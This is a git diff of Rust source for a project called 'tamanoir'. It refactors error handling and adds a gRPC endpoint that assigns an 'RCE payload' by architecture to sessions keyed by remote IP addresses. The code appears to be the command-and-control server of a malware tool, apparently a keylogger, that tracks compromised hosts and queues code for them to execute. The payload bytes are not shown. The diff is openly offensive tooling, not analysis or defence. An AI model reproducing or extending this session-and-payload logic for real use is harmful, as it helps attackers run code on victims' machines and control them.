@@ -12,7 +12,6 @@ use std::{
     sync::Arc,
 };
 
-use anyhow::Error;
 use handlers::grpc::greeter::MyGreeter;
 use log::{debug, info};
 use serde::Deserialize;
@@ -22,7 +21,7 @@ use tonic::{transport::Server, Request, Response, Status};
 use crate::handlers::grpc::tamanoir_grpc::{
     greeter_server::GreeterServer,
     proxy_server::{Proxy, ProxyServer},
-    NoArgs, SessionResponse, SessionsResponse,
+    GetSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
 };
 
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
@@ -161,12 +160,12 @@ impl Session {
             _ => None,
         }
     }
-    pub fn set_rce_payload(&mut self, rce: String, target_arch: TargetArch) -> anyhow::Result<()> {
+    pub fn set_rce_payload(&mut self, rce: &str, target_arch: TargetArch) -> Result<(), String> {
         if let Some(_) = self.rce_payload {
-            return Err(Error::msg(format!(
+            return Err(format!(
                 "An out payload already exists for session {}",
                 self.ip
-            )));
+            ));
         }
         match target_arch {
             TargetArch::X86_64 => match &*rce {
@@ -174,15 +173,12 @@ impl Session {
                     self.rce_payload = Some(HELLO_X86_64.to_vec());
                     Ok(())
                 }
-                _ => Err(Error::msg(format!(
+                _ => Err(format!(
                     "{} payload unavailable for arch {:#?}",
                     rce, target_arch
-                ))),
+                )),
             },
-            _ => Err(Error::msg(format!(
-                "target arch {:#?} unavailable",
-                target_arch
-            ))),
+            _ => Err(format!("target arch {:#?} unavailable", target_arch)),
         }
     }
 }
@@ -254,6 +250,19 @@ struct CargoMetadata {
 struct PackageMetadata {
     name: String,
 }
+pub async fn serve_tonic(sessions: SessionsStore) -> anyhow::Result<()> {
+    let addr = "[::1]:50051".parse().unwrap();
+    let greeter = MyGreeter::default();
+
+    info!("Starting grpc server");
+    debug!("Grpc server is listning on  [::1]:50051");
+    Server::builder()
+        .add_service(GreeterServer::new(greeter))
+        .add_service(ProxyServer::new(sessions))
+        .serve(addr)
+        .await?;
+    Ok(())
+}
 
 type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
 #[derive(Clone)]
@@ -273,9 +282,9 @@ impl Proxy for SessionsStore {
     async fn get_sessions(
         &self,
         request: Request<NoArgs>,
-    ) -> Result<Response<SessionsResponse>, Status> {
+    ) -> Result<Response<GetSessionsResponse>, Status> {
         debug!(
-            "<get_sessions> Got a request from {:?}",
+            "<GetSessions> Got a request from {:?}",
             request.remote_addr()
         );
         let current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
@@ -289,21 +298,40 @@ impl Proxy for SessionsStore {
             })
         }
 
-        let reply = SessionsResponse { sessions };
+        let reply = GetSessionsResponse { sessions };
         Ok(Response::new(reply))
     }
-}
+    async fn set_session_rce(
+        &self,
+        request: Request<SetSessionRceRequest>,
+    ) -> Result<Response<NoArgs>, Status> {
+        debug!(
+            "<SetSessionRce> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let req = request.into_inner();
+        let ip = Ipv4Addr::from_str(&req.ip)
+            .map_err(|_| Status::new(402.into(), format!("{}: invalid ip", req.ip)))?;
 
-pub async fn serve_tonic(sessions: SessionsStore) -> anyhow::Result<()> {
-    let addr = "[::1]:50051".parse().unwrap();
-    let greeter = MyGreeter::default();
-
-    info!("Starting grpc server");
-    debug!("Grpc server is listning on  [::1]:50051");
-    Server::builder()
-        .add_service(GreeterServer::new(greeter))
-        .add_service(ProxyServer::new(sessions))
-        .serve(addr)
-        .await?;
-    Ok(())
+        let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+            self.sessions.lock().await;
+        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
+            Status::new(
+                402.into(),
+                format!("{}: unknown target arch", req.target_arch),
+            )
+        })?;
+        match current_sessions.get_mut(&ip) {
+            Some(existing_session) => {
+                match existing_session.set_rce_payload(&req.rce, target_arch) {
+                    Ok(_) => Ok(Response::new(NoArgs {})),
+                    Err(_) => Err(Status::new(404.into(), format!("{}: invalid rce", req.rce))),
+                }
+            }
+            None => Err(Status::new(
+                404.into(),
+                format!("{}: session not found", ip),
+            )),
+        }
+    }
 }
